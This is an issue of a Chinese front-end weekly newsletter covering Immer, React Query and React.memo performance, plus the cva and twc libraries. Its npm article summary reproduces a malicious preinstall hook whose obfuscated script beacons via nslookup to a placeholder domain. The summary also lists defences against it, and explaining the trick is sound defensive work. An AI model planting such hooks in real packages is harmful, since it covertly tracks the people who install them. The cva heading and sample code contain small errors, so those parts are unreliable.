---
title: "React 应用中的性能优化"
date: 2024-03-15T00:00:00.000Z
release: 32
---

前端爱好者周刊 (Github: shfshanyue/weekly)，每周记录关于前端的开源工具、优秀文章、重大库版本发布记录等等，周刊中优秀文章会在公众号**全栈成长之路**逐一推送。每周一发布，订阅平台如下，欢迎订阅。

- 订阅网站: <https://weekly.shanyue.tech>
- 订阅Github: [shfshanyue/weekly](https://github.com/shfshanyue/weekly)
- [点击在微信订阅](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MjM5NjU5NjQ0NQ==&scene=1&album_id=1880625492081344514&count=3#wechat_redirect)

## 小技巧

- 快速跳转到文件特定行。在 vim 中，只需输入 `:<行号>`，如 `:25` 然后按 Enter，即可快速跳转到第 25 行。
- VSCode 多游标编辑。按下 `Ctrl`（Cmd）+ `Alt`（Option）+ 向上或向下的箭头键，可以在上/下方创建一个新光标，从而同时在多行上进行编辑。
- JavaScript 深拷贝对象。使用 `JSON.parse(JSON.stringify(obj))` 可以对对象 `obj` 进行简单的深拷贝。
- 使用 git add -p 可以选择性地暂存代码改动的一部分，做到精细化的提交，每次提交只包含一个逻辑更改。

## 文章推荐

### 一、 [immer 性能优化意见](https://immerjs.github.io/immer/performance)

![](https://static.shanyue.tech/images/24-03-14/clipboard-4635.0be323.webp)

Immer 是一款处理不可变数据的 JavaScript 库，其性能表现上乘，这得益于它**能够识别出无实质变化的状态并返回原状态，避免了不必要的重新渲染** 。

如果想要向状态树中添加大量的数据，可以先进行冻结操作：

```js
import { freeze } from "immer";

data = freeze(bigData);
```

具有高性能需求的 reducer 可选择手动编写，而对于常规的 reducer 则可以使用 Immer 进行处理：

```js
let state = //...
let action = //...

function reducer(state, action) {
    switch (action.type) {
        // 手动编写的更新逻辑
        case "UPDATE_HIGH_PERFORMANCE":
        // 使用 Immer 进行状态更新
        case "UPDATE_NORMAL":
            return produce(state, draft => { /* 更新逻辑 */ })
        default:
            return state
    }
}
```

最后，我们应该尽量提升 produce 的调用层级以提升性能。

```javascript
produce(baseState, (draft) => {
  // 将 for 循环置于 produce 内部，而非外部
  for (let i = 0; i < arr.length; i++) draft.push(arr[i]);
});
```

### 二、 [React Query 渲染优化](https://tkdodo.eu/blog/react-query-render-optimizations)

在这篇文章中，详解了 React Query 如何进行渲染优化。主要介绍了 `isFetching` 字段，这个字段会在发起请求时设置为 true，但如果你不打算显示加载状态，就可能引发不必要的重绘。

同时，还介绍了 `notifyOnChangeProps` 选项：

```ts
export const useTodosQuery = (select, notifyOnChangeProps) =>
  useQuery({
    queryKey: ["todos"],
    queryFn: fetchTodos,
    select,
    notifyOnChangeProps,
  });
export const useTodosCount = () =>
  useTodosQuery((data) => data.length, ["data"]);
```

在跟踪查询中， React Query 会记录渲染过程中用到的字段，并根据这些字段计算出变更列表。这个特性可以通过将 `notifyOnChangeProps` 设为 'tracked' 来启用：

```ts
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      notifyOnChangeProps: "tracked",
    },
  },
});
```

最后，作者介绍了结构共享(Structural sharing)，这个技巧会在数据结构的每一级中保持引用的一致性。只有在数据发生变动的部分，才会在新旧状态中进行复制，从而优化渲染。

其渲染优化核心函数可见 [replaceEqualDeep](https://github.com/TanStack/query/blob/80cecef22c3e088d6cd9f8fbc5cd9e2c0aab962f/src/core/tests/utils.test.tsx#L97-L304)

### 三、 [实际上，React.memo 很有用](https://timtech.blog/posts/react-memo-is-good-actually/)

本文是作者基于个人经验对 React.memo, React.useMemo 和 React.useCallback 的看法。

作者指出这些性能 API 被错误地看作有害，并解释如何正确使用它们。他反驳了多个关于这些 API 的常见误解，比如它们会减慢应用速度、只有在特定情况下有用、会破坏代码的可读性和可维护性等观点。

文章还解释了怎样通过优化对 React.memo 包裹的组件的 props 传递来提升性能，同时强调，在合理的情况下应该考虑使用性能 API。

最后，作者表达了对在 React 代码中追求效率的热情，并坚信正确使用性能 API 会提高应用性能。

### 四、 [如何运用 npm install 脚本进行攻击：一个 npm 包含恶意代码的实际例子](https://stacklok.com/blog/how-npm-install-scripts-can-be-weaponized-a-real-life-example-of-a-harmful-npm-package)

文章介绍了 npm 预安装和后安装脚本如何被用为注入恶意代码到开源包的方式，并举出了一个实际的恶意 npm 包的例子。

在这个例子中，有一个名为 "very-trustyworthy-package" 的包，它包括一个在安装时运行的 `preinstall` 脚本，该脚本有一个 `install.sh` 的 shell 脚本。

```json
{
  “name”: “very-trustyworthy-package”,
  “version”: “0.0.42”,
  “scripts”: {
    “preinstall”: “sh install.sh”
  }
}
```

```shell
#!/usr/bin/env sh

echo “Starting build..."
amount=ample
former=ex
organization=org
install_a=nslo
install_b=okup

$install_a$install_b trustworthy-package.xyz.$former$amount.$organization >/dev/null

echo “Build succeeded..."
```

执行上述安装脚本后，它会进行一个 DNS 调用，查找 `trustworthy-package.xyz.example.org`。

这个包的设计者可以通过这种方式知道有人安装了他们的包，并获取了一些信息。

文中也提供了一些方法来保护自身安全，比如运行带有 `--ignore-scripts` 选项的 npm，避免执行`preinstall` 或 `postinstall` 脚本，并使用 Trusty 和 Minder 这类自动化的依赖分析和强制执行的工具。

## 开源与库

### 一、 [twc，基于 react 与 tailwind 通过一行代码就能创建出可复用的组件](https://cva.style/docs)

cva 旨在为开发者提供一种更方便的方法，以解决 "传统" 的 CSS 方法在创建 CSS 类变体以及匹配类到组件属性时可能出现的一些麻烦。

在传统的方法中，开发者需要将 CSS 类手动匹配到组件的属性，并手动添加类型。这些看似简单，实际上却可能非常繁琐和耗时。

cva 帮助开发者简化这些过程，让他们可以专心于 UI 开发的有趣部分。具体地，如果你需要在组件中创建一个 'primary' 变体，你可以这样做：

```javascript
mport { cva } from "class-variance-authority";

const button = cva(["font-semibold", "border", "rounded"], {
  variants: {
    intent: {
      primary: [
        "bg-blue-500",
        "text-white",
        "border-transparent",
        "hover:bg-blue-600",
      ],
      secondary: [
        "bg-white",
        "text-gray-800",
        "border-gray-400",
        "hover:bg-gray-100",
      ],
    },
    size: {
      small: ["text-sm", "py-1", "px-2"],
      medium: ["text-base", "py-2", "px-4"],
    },
  },
  defaultVariants: {
    intent: "primary",
    size: "medium",
  },
});

button();
// => "font-semibold border rounded bg-blue-500 text-white border-transparent hover:bg-blue-600 text-base py-2 px-4 uppercase"

button({ intent: "secondary", size: "small" });
```

如上所示，cva 提供了一种简洁高效的方式来定义和管理 CSS 类。这可以大大提高开发者的工作效率，并使得他们能够专注于开发更多有趣的 UI 功能。

- [npm: twc](https://npm.devtool.tech/twc)

### 二、 [twc，基于 react 与 tailwind 通过一行代码就能创建出可复用的组件](https://react-twc.vercel.app/)

TWC 为 React 和 Tailwind CSS 提供了强有力的结合，通过一行代码就能创建出可复用的组件。

它的特性包括轻量级、全编辑器支持、基于属性的样式适应、类复用支持和所有组件兼容。你甚至可以在服务器端渲染 React 组件。

并且，TWC 提供了对 tailwind-merge 和 cva 的一流支持。以下是一个使用和不使用 TWC 的示例：

使用 TWC 前：

```javascript
import * as React from "react";

const Card = React.forwardRef<
  HTMLDivElement,
  React.HTMLAttributes<HTMLDivElement>
>(({ className, ...props }, ref) => (
  <div
    ref={ref}
    className={clsx(
      "rounded-lg border bg-slate-100 text-white shadow-sm",
      className,
    )}
    {...props}
  />
));
```

使用 TWC 后：

```javascript
import { twc } from "react-twc";

const Card = twc.div`rounded-lg border bg-slate-100 text-white shadow-sm`;
```

从以上代码可以看出，使用 TWC 创建组件可以使代码更加简洁和易读，减少了样式代码的复杂性。

- [repo: gregberge/twc](https://github.com/gregberge/twc)
- [npm: twc](https://npm.devtool.tech/twc)

## 开发利器

### 一、 [Code To Graph](https://crubier.github.io/code-to-graph/)

Code To Graph 是一个用于可视化代码的在线工具。它能够将代码转换成图形，并显示其执行流程。

![](https://static.shanyue.tech/images/24-03-15/clipboard-4405.8f86f9.webp)
